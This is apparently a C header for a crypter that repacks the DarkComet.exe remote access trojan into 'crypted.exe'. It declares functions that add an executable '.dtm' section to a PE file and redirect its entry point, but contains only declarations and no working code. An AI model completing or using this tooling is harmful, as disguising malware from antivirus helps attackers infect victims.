#define MAX_SECTION_NAME 8

#define NAME 			".dtm"
#define CHARACTERISTICS IMAGE_SCN_MEM_EXECUTE | \
						IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE
#define TARGET_FILE		"\\DarkComet.exe"
#define OUTPUT_FILE		"\\crypted.exe"

typedef struct _section_header {
	char Name[MAX_SECTION_NAME];
	DWORD VirtualSize;
	DWORD VirtualAddress;
	DWORD SizeOfRawData;
	DWORD PointerToRawData;
	DWORD PointerToRelocations;
	DWORD PointerToLinenumbers;
	SHORT NumberOfRelocations;
	SHORT NumberOfLinenumbers;
	DWORD Characteristics;
} SECTION_HEADER, *PSECTION_HEADER;

// debug printer
VOID print_debug (LPCSTR, ...);

// name + characteristics
PSECTION_HEADER new_section_header (VOID);
// free section header
VOID free_section_header (PSECTION_HEADER);
// extract headers from target file
PIMAGE_DOS_HEADER get_dos_header (LPVOID);
PIMAGE_NT_HEADERS get_pe_header (LPVOID);
PIMAGE_FILE_HEADER get_file_header (LPVOID);
PIMAGE_OPTIONAL_HEADER get_optional_header (LPVOID);
PIMAGE_SECTION_HEADER get_first_section_header (LPVOID);
// check space for new section header
// BOOL has_space_for_section (PIMAGE_SECTION_HEADER, SHORT);
// handle to file + section header info
BOOL add_new_section (LPVOID, PSECTION_HEADER);
VOID redirect_entry_point (LPVOID, PSECTION_HEADER);
BOOL write_to_section (HANDLE, HANDLE, PSECTION_HEADER);